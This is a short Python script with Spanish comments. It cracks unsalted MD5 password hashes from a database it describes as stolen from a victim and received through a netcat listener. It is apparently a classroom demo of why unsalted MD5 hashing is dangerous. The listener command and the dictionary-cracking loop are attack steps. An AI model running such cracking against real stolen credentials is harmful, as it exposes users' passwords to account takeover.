import sqlite3
import hashlib

# Base de datos robada de la víctima (recibida con: nc -lvnp 5555 > portal.db)
con = sqlite3.connect("portal.db")
filas = con.execute("SELECT usuario, password, rol FROM usuarios").fetchall()

# Ataque de diccionario. MD5 SIN SALT permite precomputar el hash de cada
# candidato y compararlo directo -> por eso el robo de la BD es catastrófico.
# En la demo se puede usar un diccionario grande (rockyou.txt); aquí uno corto.
diccionario = ["operador123", "SuperAdmin2026!", "admin", "123456",
               "password", "qwerty", "portal2026"]
tabla = {hashlib.md5(p.encode()).hexdigest(): p for p in diccionario}

print("usuario | rol | hash MD5 | contraseña recuperada")
for usuario, h, rol in filas:
    print(f"{usuario} | {rol} | {h} | {tabla.get(h, '[no crackeado]')}")